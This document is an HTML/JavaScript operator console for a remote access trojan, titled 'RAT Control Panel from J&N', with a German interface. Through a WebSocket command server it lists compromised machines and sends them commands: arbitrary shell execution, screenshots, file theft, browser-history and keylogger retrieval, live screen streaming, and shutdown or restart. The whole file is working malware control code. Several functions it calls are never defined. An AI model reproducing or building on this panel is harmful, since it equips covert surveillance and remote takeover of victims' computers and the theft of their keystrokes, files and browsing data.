<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>RAT Control Panel from J&N</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    :root {
      --bg: #232526;
      --bg-panel: #23272f;
      --text: #e0e0e0;
      --accent: #8ecae6;
      --accent2: #43d17a;
      --danger: #f44336;
      --shadow: 0 8px 32px 0 rgba(31,38,135,0.25);
      --border: #2c2f36;
      --panel-radius: 18px;
      --transition: 0.18s;
    }
    html, body {
      height: 100%;
      min-height: 100vh;
      margin: 0;
      padding: 0;
      width: 100vw;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      min-width: 100vw;
      width: 100vw;
      height: 100vh;
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, var(--bg) 0%, #414345 100%);
      color: var(--text);
      font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      justify-content: stretch;
      transition: background var(--transition), color var(--transition);
      box-sizing: border-box;
      overflow: hidden;
    }
    .container {
      display: flex;
      flex-direction: row;
      gap: 32px;
      margin: 0;
      width: 100vw;
      height: 100vh;
      max-width: 100vw;
      max-height: 100vh;
      box-sizing: border-box;
      align-items: stretch;
      justify-content: stretch;
    }
    .panel {
      background: var(--bg-panel);
      border-radius: var(--panel-radius);
      box-shadow: var(--shadow);
      padding: 28px 24px;
      min-width: 320px;
      max-width: 420px;
      flex: 1 1 350px;
      display: flex;
      flex-direction: column;
      margin-bottom: 0;
      transition: background var(--transition), color var(--transition);
      height: 100%;
      box-sizing: border-box;
    }
    #client-panel {
      max-width: 340px;
      min-width: 220px;
      flex: 0 0 260px;
      height: 100%;
      box-sizing: border-box;
    }
    #main-panel {
      flex: 2 1 600px;
      min-width: 400px;
      max-width: 100vw;
      height: 100%;
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
    }
    h2 {
      margin-top: 0;
      margin-bottom: 18px;
      font-weight: 600;
      font-size: 1.3em;
      letter-spacing: 0.03em;
      color: var(--accent);
      border-bottom: 1px solid var(--border);
      padding-bottom: 8px;
    }
    #client-list {
      list-style: none;
      padding: 0;
      margin: 0;
      flex-grow: 1;
      overflow-y: auto;
      max-height: calc(100vh - 120px);
    }
    #client-list li {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 12px 10px;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 7px;
      border: 1px solid transparent;
      background: var(--bg-panel);
      transition: background var(--transition), border var(--transition);
      font-size: 1.05em;
      position: relative;
    }
    #client-list li.selected, #client-list li:hover {
      background: #2b3140;
      border-color: var(--accent);
    }
    .client-status-dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: var(--accent2);
      margin-right: 4px;
      box-shadow: 0 0 4px #43d17a88;
    }
    .client-os {
      width: 18px;
      height: 18px;
      margin-right: 6px;
      opacity: 0.8;
    }
    .client-tooltip {
      display: none;
      position: absolute;
      left: 110%;
      top: 0;
      background: #23272a;
      color: #fff;
      border-radius: 7px;
      padding: 8px 14px;
      font-size: 0.98em;
      box-shadow: 0 4px 16px #000a;
      z-index: 10;
      min-width: 180px;
      max-width: 320px;
      pointer-events: none;
    }
    #client-list li:hover .client-tooltip {
      display: block;
    }
    #output {
      flex-grow: 1;
      background: #181a20;
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 12px;
      font-family: "Fira Mono", "Consolas", "Courier New", monospace;
      white-space: pre-wrap;
      word-break: break-word;
      overflow-y: auto;
      margin-bottom: 14px;
      min-height: 120px;
      max-height: 260px;
      font-size: 1.01em;
      position: relative;
    }
    #copy-output {
      position: absolute;
      top: 8px;
      right: 12px;
      background: var(--accent);
      color: #fff;
      border: none;
      border-radius: 5px;
      padding: 4px 10px;
      font-size: 0.95em;
      cursor: pointer;
      opacity: 0.7;
      transition: opacity 0.15s;
    }
    #copy-output:hover { opacity: 1; }
    #controls {
      display: flex;
      gap: 10px;
      flex-wrap: wrap;
      margin-bottom: 10px;
      align-items: center;
    }
    #send-button {
      background: linear-gradient(90deg, #3a506b 0%, #5bc0be 100%);
      color: #fff;
      border: none;
      padding: 9px 16px;
      border-radius: 7px;
      font-size: 1em;
      font-weight: 500;
      cursor: pointer;
      margin-left: 8px;
      box-shadow: 0 2px 8px #0002;
      transition: background var(--transition), box-shadow var(--transition);
    }
    #send-button:hover {
      background: linear-gradient(90deg, #5bc0be 0%, #3a506b 100%);
      box-shadow: 0 4px 16px #0003;
    }
    input[type="text"] {
      flex-grow: 1;
      background: var(--bg-panel);
      border: 1px solid var(--border);
      color: var(--text);
      padding: 11px;
      border-radius: 7px;
      font-size: 1em;
      outline: none;
      transition: border var(--transition), background var(--transition), color var(--transition);
    }
    input[type="text"]:focus {
      border-color: var(--accent);
    }
    #upload-input {
      display: none;
    }
    .log-entry {
      padding: 2px 0;
    }
    .log-info { color: var(--accent2); }
    .log-error { color: var(--danger); }
    .log-cmd { color: var(--accent); }
    /* --- Live Screen --- */
    #screen-canvas {
      display: block;
      margin: 0 auto;
      background: #181818;
      border-radius: 10px;
      box-shadow: 0 2px 12px #0003;
      border: 1px solid var(--border);
      max-width: 100%;
      max-height: 60vh;
      transition: box-shadow var(--transition);
      cursor: zoom-in;
      margin-top: 18px;
    }
    #screen-status {
      margin-top: 7px;
      color: #b9bbbe;
      font-size: 1em;
      text-align: center;
      letter-spacing: 0.01em;
    }
    /* --- Debug Panel --- */
    #debug-panel {
      display: none;
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100vw;
      max-height: 30vh;
      background: #181a20f0;
      color: #fff;
      font-family: "Fira Mono", monospace;
      font-size: 0.98em;
      border-top: 2px solid #8ecae6;
      z-index: 9999;
      overflow-y: auto;
      padding: 10px 18px 10px 18px;
      box-sizing: border-box;
      transition: max-height 0.2s;
    }
    #debug-toggle {
      position: fixed;
      bottom: 32px;
      right: 32px;
      background: #23272f;
      color: #8ecae6;
      border: 2px solid #8ecae6;
      border-radius: 50%;
      width: 44px;
      height: 44px;
      font-size: 1.5em;
      cursor: pointer;
      z-index: 10000;
      box-shadow: 0 2px 12px #0005;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: background 0.18s, color 0.18s;
    }
    #debug-toggle:hover {
      background: #8ecae6;
      color: #23272f;
    }
    .debug-log-entry {
      margin-bottom: 2px;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .debug-log-error { color: #f44336; }
    .debug-log-info { color: #43d17a; }
    .debug-log-warn { color: #ffb300; }
    @media (max-width: 1100px) {
      .container { flex-direction: column; align-items: stretch; }
      #main-panel { max-width: 100%; }
    }
    @media (max-width: 700px) {
      .container { flex-direction: column; gap: 10px; margin: 0; }
      .panel { padding: 12px 6px; min-width: unset; }
      #main-panel { min-width: unset; }
    }
    /* --- Discord-Style Command Suggestion --- */
    #command-suggest {
      position: absolute;
      background: #23272a;
      color: #fff;
      border-radius: 6px;
      box-shadow: 0 4px 16px #000a;
      min-width: 220px;
      max-width: 350px;
      z-index: 1000;
      margin-top: 2px;
      padding: 4px 0;
      font-size: 1em;
      display: none;
    }
    #command-suggest .suggest-item {
      padding: 8px 16px;
      cursor: pointer;
      display: flex;
      align-items: center;
    }
    #command-suggest .suggest-item.selected,
    #command-suggest .suggest-item:hover {
      background: #5865f2;
      color: #fff;
    }
    #command-suggest .suggest-desc {
      color: #b9bbbe;
      font-size: 0.95em;
      margin-left: 10px;
      flex: 1;
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="client-panel" class="panel">
      <h2>Clients</h2>
      <ul id="client-list"></ul>
    </div>
    <div id="main-panel" class="panel">
      <div id="output">
        <button id="copy-output" title="Kopieren">üìã</button>
      </div>
      <div id="controls" style="position:relative;">
        <input
          type="text"
          id="command-input"
          placeholder="Befehle: /exec, /screenshot, /download, /history, /keylogger, /ls, /systeminfo"
          autocomplete="off"
        />
        <div id="command-suggest" role="listbox" aria-label="Befehlsvorschl√§ge"></div>
        <button id="send-button">Senden</button>
        <input type="file" id="upload-input" />
      </div>
      <div id="live-screen-area" style="display:none;">
        <canvas id="screen-canvas" tabindex="0"></canvas>
        <div id="screen-status"></div>
      </div>
    </div>
  </div>
  <button id="debug-toggle" title="Debug anzeigen/verstecken">üêû</button>
  <div id="debug-panel"></div>
  <script>
    // --- DOM ELEMENTE OBEN DEFINIEREN ---
    const commandInput = document.getElementById("command-input");
    const sendButton = document.getElementById("send-button");
    const uploadInput = document.getElementById("upload-input");
    const output = document.getElementById("output");
    const copyBtn = document.getElementById("copy-output");
    const clientList = document.getElementById("client-list");
    const screenCanvas = document.getElementById('screen-canvas');
    const screenStatus = document.getElementById('screen-status');
    const commandSuggest = document.getElementById("command-suggest");
    const liveScreenArea = document.getElementById('live-screen-area');
    const debugPanel = document.getElementById('debug-panel');
    const debugToggle = document.getElementById('debug-toggle');
    // Optional: Theme toggle, screenZoom, screenScreenshot, etc. nur wenn im HTML vorhanden
    let screenZoom = document.getElementById('screen-zoom');
    let screenScreenshot = document.getElementById('screen-screenshot');

    // --- DEBUG PANEL ---
    let debugEnabled = false;
    debugToggle.onclick = () => {
      debugEnabled = !debugEnabled;
      debugPanel.style.display = debugEnabled ? "block" : "none";
    };
    function debugLog(msg, type="info") {
      if (!debugPanel) return;
      const div = document.createElement("div");
      div.className = "debug-log-entry debug-log-" + type;
      div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
      debugPanel.appendChild(div);
      debugPanel.scrollTop = debugPanel.scrollHeight;
    }

    // --- OUTPUT COPY ---
    copyBtn.onclick = () => {
      const text = output.innerText.replace(/^üìã/, '').trim();
      navigator.clipboard.writeText(text);
      copyBtn.textContent = "‚úÖ";
      setTimeout(() => (copyBtn.textContent = "üìã"), 1200);
    };

    // --- CLIENT-LISTENFUNKTIONEN ---
    function osIcon(os) {
      if (!os) return "";
      if (os.toLowerCase().includes("windows")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/windows8/windows8-original.svg" alt="Windows">';
      if (os.toLowerCase().includes("linux")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" alt="Linux">';
      if (os.toLowerCase().includes("darwin") || os.toLowerCase().includes("mac")) return '<img class="client-os" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/apple/apple-original.svg" alt="macOS">';
      return "";
    }
    function createClientListItem(client) {
      const li = document.createElement("li");
      li.innerHTML = `<span class="client-status-dot"></span>
        ${osIcon(client.os)}
        <span>${client.hostname || "Unbekannt"}</span>
        <span style="margin-left:auto;font-size:0.97em;color:#b9bbbe;">${client.ip || client.address[0]}</span>
        <span class="client-tooltip">
          <b>Hostname:</b> ${client.hostname || "?"}<br>
          <b>OS:</b> ${client.os || "?"}<br>
          <b>IP:</b> ${client.ip || client.address[0]}
        </span>`;
      li.dataset.clientId = client.id;
      if (client.id === selectedClientId) li.classList.add("selected");
      li.addEventListener("click", () => selectClient(client.id, client));
      return li;
    }
    function renderClientList(clients) {
      clientList.innerHTML = "";
      clients.forEach((client) => {
        const li = createClientListItem(client);
        clientList.appendChild(li);
      });
    }
    function selectClient(id, clientObj) {
      selectedClientId = id;
      selectedClient = id;
      document.querySelectorAll("#client-list li").forEach((el) => el.classList.remove("selected"));
      const li = clientList.querySelector(`li[data-client-id='${id}']`);
      if (li) li.classList.add("selected");
      log(`Client ${clientObj?.hostname || id} ausgew√§hlt.`, "cmd");
      screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
      screenStatus.textContent = '';
    }

    // --- LOGGING ---
    function log(message, type = "info") {
      const entry = document.createElement("div");
      entry.className = `log-entry log-${type}`;
      entry.innerHTML = highlightSyntax(`[${new Date().toLocaleTimeString()}] ${message}`);
      output.appendChild(entry);
      output.scrollTop = output.scrollHeight;
      debugLog(message, type);
    }
    function highlightSyntax(text) {
      return text
        .replace(/(error|fehler)/gi, '<span style="color:#f44336;font-weight:bold">$1</span>')
        .replace(/(\$ |PS |C:\\\\|C:\/)/g, '<span style="color:#8ecae6;font-weight:bold">$1</span>');
    }

    // --- COMMAND HISTORY ---
    let cmdHistory = [], cmdHistoryIdx = -1;
    commandInput.addEventListener("keydown", (e) => {
      if (e.key === "ArrowUp") {
        if (cmdHistory.length && cmdHistoryIdx > 0) {
          cmdHistoryIdx--;
          commandInput.value = cmdHistory[cmdHistoryIdx];
          e.preventDefault();
        }
      } else if (e.key === "ArrowDown") {
        if (cmdHistory.length && cmdHistoryIdx < cmdHistory.length - 1) {
          cmdHistoryIdx++;
          commandInput.value = cmdHistory[cmdHistoryIdx];
          e.preventDefault();
        } else if (cmdHistoryIdx === cmdHistory.length - 1) {
          commandInput.value = "";
          cmdHistoryIdx = cmdHistory.length;
        }
      }
    });

    // --- DISCORD-STYLE COMMAND SUGGESTION ---
    const COMMANDS = [
      { cmd: "/help", desc: "Zeigt die Hilfe an" },
      { cmd: "/exec", desc: "F√ºhre einen Shell-Befehl aus" },
      { cmd: "/screenshot", desc: "Screenshot des Bildschirms" },
      { cmd: "/download", desc: "Datei herunterladen (Pfad angeben)" },
      { cmd: "/upload", desc: "Datei zum Client hochladen" },
      { cmd: "/history", desc: "Browserverlauf anzeigen" },
      { cmd: "/keylogger", desc: "Keylogger-Log anzeigen" },
      { cmd: "/ls", desc: "Verzeichnis auflisten" },
      { cmd: "/systeminfo", desc: "Systeminformationen anzeigen" },
      { cmd: "/shutdown", desc: "Client herunterfahren" },
      { cmd: "/restart", desc: "Client neustarten" },
      { cmd: "/screenstream_start", desc: "Live-Screen starten" },
      { cmd: "/screenstream_stop", desc: "Live-Screen stoppen" }
    ];
    let suggestActive = false;
    let suggestItems = [];
    let suggestIndex = 0;
    function showSuggest(filtered) {
      if (!filtered.length) {
        commandSuggest.style.display = "none";
        suggestActive = false;
        return;
      }
      commandSuggest.innerHTML = "";
      filtered.forEach((item, idx) => {
        const div = document.createElement("div");
        div.className = "suggest-item" + (idx === suggestIndex ? " selected" : "");
        div.setAttribute("role", "option");
        div.setAttribute("id", "suggest-item-" + idx);
        div.innerHTML = `<span style="font-weight:600;min-width:110px;">${item.cmd}</span><span class="suggest-desc">${item.desc}</span>`;
        div.addEventListener("mousedown", (e) => {
          e.preventDefault();
          selectSuggest(idx, filtered);
        });
        div.addEventListener("mouseenter", () => {
          suggestIndex = idx;
          updateSuggestHighlight();
        });
        commandSuggest.appendChild(div);
      });
      // Positionierung direkt unter dem Input
      const rect = commandInput.getBoundingClientRect();
      commandSuggest.style.position = "absolute";
      commandSuggest.style.left = commandInput.offsetLeft + "px";
      commandSuggest.style.top = (commandInput.offsetTop + commandInput.offsetHeight) + "px";
      commandSuggest.style.width = commandInput.offsetWidth + "px";
      commandSuggest.style.display = "block";
      suggestActive = true;
    }
    function hideSuggest() {
      commandSuggest.style.display = "none";
      suggestActive = false;
    }
    function selectSuggest(idx, filtered) {
      const cmd = filtered[idx].cmd;
      commandInput.value = cmd + " ";
      hideSuggest();
      commandInput.focus();
    }
    function updateSuggestHighlight() {
      [...commandSuggest.children].forEach((el, i) => {
        if (i === suggestIndex) el.classList.add("selected");
        else el.classList.remove("selected");
      });
    }
    commandInput.addEventListener("input", (e) => {
      const val = commandInput.value;
      if (val.startsWith("/")) {
        const filtered = COMMANDS.filter(c =>
          c.cmd.startsWith(val) || c.cmd.replace("/", "").startsWith(val.replace("/", ""))
        );
        suggestItems = filtered;
        suggestIndex = 0;
        showSuggest(filtered);
      } else {
        hideSuggest();
      }
    });
    commandInput.addEventListener("keydown", (e) => {
      if (!suggestActive) return;
      if (e.key === "ArrowDown") {
        suggestIndex = (suggestIndex + 1) % suggestItems.length;
        updateSuggestHighlight();
        e.preventDefault();
      } else if (e.key === "ArrowUp") {
        suggestIndex = (suggestIndex - 1 + suggestItems.length) % suggestItems.length;
        updateSuggestHighlight();
        e.preventDefault();
      } else if (e.key === "Tab" || e.key === "Enter") {
        if (suggestActive && suggestItems.length) {
          selectSuggest(suggestIndex, suggestItems);
          e.preventDefault();
        }
      } else if (e.key === "Escape") {
        hideSuggest();
      }
    });
    commandInput.addEventListener("blur", () => {
      setTimeout(hideSuggest, 120);
    });

    // --- LIVE SCREEN ANZEIGE NUR BEI COMMAND ---
    let liveScreenActive = false;
    function handleLiveScreenCommand(cmd) {
      if (cmd === "/screenstream_start") {
        liveScreenArea.style.display = "";
        liveScreenActive = true;
        debugLog("Live-Screen Panel aktiviert", "info");
      } else if (cmd === "/screenstream_stop") {
        liveScreenArea.style.display = "none";
        liveScreenActive = false;
        const ctx = screenCanvas.getContext('2d');
        ctx.clearRect(0, 0, 9999, 9999);
        screenStatus.textContent = '';
        debugLog("Live-Screen Panel deaktiviert", "info");
      }
    }

    // --- BEFEHL SENDEN ---
    function sendCommand(customPayload = null) {
      if (!selectedClientId) {
        log("Fehler: Kein Client ausgew√§hlt.", "error");
        debugLog("Kein Client ausgew√§hlt beim Senden", "warn");
        return;
      }
      let payload;
      if (customPayload) {
        payload = { target_id: selectedClientId, ...customPayload };
      } else {
        const commandText = commandInput.value.trim();
        if (!commandText) return;
        if (commandText.startsWith("/screenstream_start")) handleLiveScreenCommand("/screenstream_start");
        if (commandText.startsWith("/screenstream_stop")) handleLiveScreenCommand("/screenstream_stop");
        let slashPayload = parseSlashCommand(commandText);
        if (slashPayload) {
          payload = { target_id: selectedClientId, ...slashPayload };
        } else {
          const parts = commandText.split(" ");
          const action = parts[0].toLowerCase();
          const argument = parts.slice(1).join(" ");
          payload = {
            target_id: selectedClientId,
            action: action,
          };
          if (action === "screenstream_start") handleLiveScreenCommand("/screenstream_start");
          if (action === "screenstream_stop") handleLiveScreenCommand("/screenstream_stop");
          switch (action) {
            case "exec":
              payload.command = argument;
              break;
            case "download":
              payload.path = argument;
              break;
            case "history":
              payload.limit = parseInt(argument) || 20;
              break;
            case "keylogger":
              payload.count = parseInt(argument) || 50;
              break;
            case "ls":
              payload.path = argument || ".";
              break;
            case "screenshot":
            case "systeminfo":
            case "shutdown":
            case "restart":
              break;
            default:
              log(
                "Unbekannter Befehl. Verf√ºgbar: exec, screenshot, download, history, keylogger, ls, systeminfo, shutdown, restart",
                "error"
              );
              debugLog("Unbekannter Befehl: " + action, "warn");
              return;
          }
        }
      }
      ws.send(JSON.stringify(payload));
      log(
        `Befehl gesendet: ${payload.action}${
          payload.command ? " " + payload.command : payload.path ? " " + payload.path : ""
        }`,
        "cmd"
      );
      debugLog("Befehl gesendet: " + JSON.stringify(payload), "info");
      commandInput.value = "";
      hideSuggest();
    }

    // --- WEBSOCKET EVENTS ---
    const ws = new WebSocket(`wss://${window.location.host}/ws`);
    let selectedClientId = null;
    let selectedClient = null;
    ws.onopen = () => { log("Verbunden mit dem Control Server."); debugLog("WebSocket verbunden", "info"); };
    ws.onclose = () => { log("Verbindung zum Control Server verloren.", "error"); debugLog("WebSocket geschlossen", "warn"); };
    ws.onerror = (err) => { log(`WebSocket Fehler: ${err}`, "error"); debugLog("WebSocket Fehler: " + err, "error"); };
    ws.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        debugLog("Empfangen: " + event.data, "info");
        switch (data.type) {
          case "client_list":
            renderClientList(data.clients);
            // --- Fix: select first client automatically if none selected ---
            if (!selectedClientId && data.clients.length > 0) {
              selectClient(data.clients[0].id, data.clients[0]);
            }
            break;
          case "client_connected":
            log(
              `Neuer Client verbunden: ${data.client.hostname || data.client.id} (${data.client.ip || data.client.address[0]})`
            );
            // --- Fix: always update client list with all known clients ---
            if (Array.isArray(data.clients)) {
              renderClientList(data.clients);
            } else if (data.client) {
              renderClientList([data.client]);
            }
            // --- Fix: select first client if none selected ---
            if (!selectedClientId && data.client) {
              selectClient(data.client.id, data.client);
            }
            break;
          case "client_disconnected":
            log(
              `Client ${data.client_id} hat die Verbindung getrennt.`,
              "error"
            );
            renderClientList([...clientList.querySelectorAll('li')].filter(li => Number(li.dataset.clientId) !== data.client_id).map(li => ({
              id: Number(li.dataset.clientId)
            })));
            if (selectedClientId === data.client_id) selectedClientId = null;
            break;
          case "command_output":
            log(
              `[Client ${data.client_id || selectedClientId}] Ausgabe:\n${data.output}`
            );
            break;
          case "screenshot":
            log(`[Client ${data.client_id}] Screenshot empfangen.`);
            const img = document.createElement("img");
            img.src = `data:image/png;base64,${data.data}`;
            img.style.maxWidth = "100%";
            img.style.marginTop = "10px";
            img.style.border = "1px solid #555";
            img.style.cursor = "pointer";
            img.title = "Klicken zum Vergr√∂√üern";
            img.onclick = () => {
              const w = window.open();
              w.document.write(`<img src="${img.src}" style="width:100%">`);
            };
            output.appendChild(img);
            output.scrollTop = output.scrollHeight;
            break;
          case "file_download":
            log(
              `[Client ${data.client_id}] Datei '${data.filename}' empfangen. Download wird gestartet.`
            );
            triggerDownload(data.filename, data.data);
            break;
          case "error":
            log(`[Server/Client Fehler] ${data.message || data.error}`, "error");
            debugLog("Server/Client Fehler: " + (data.message || data.error), "error");
            break;
        }
        // Live-Screen-Frame
        if (data.action === 'screen_frame' && data.client_id === selectedClient && liveScreenActive) {
          if (data.img_bytes && data.width && data.height) {
            drawScreenFrame(data.img_bytes, data.width, data.height);
          }
        }
      } catch (err) {
        debugLog("Fehler beim Parsen der Nachricht: " + err, "error");
      }
    };

    // --- EVENT-HANDLER ---
    sendButton.addEventListener("click", sendCommand);
    commandInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") sendCommand();
    });
  </script>
</body>
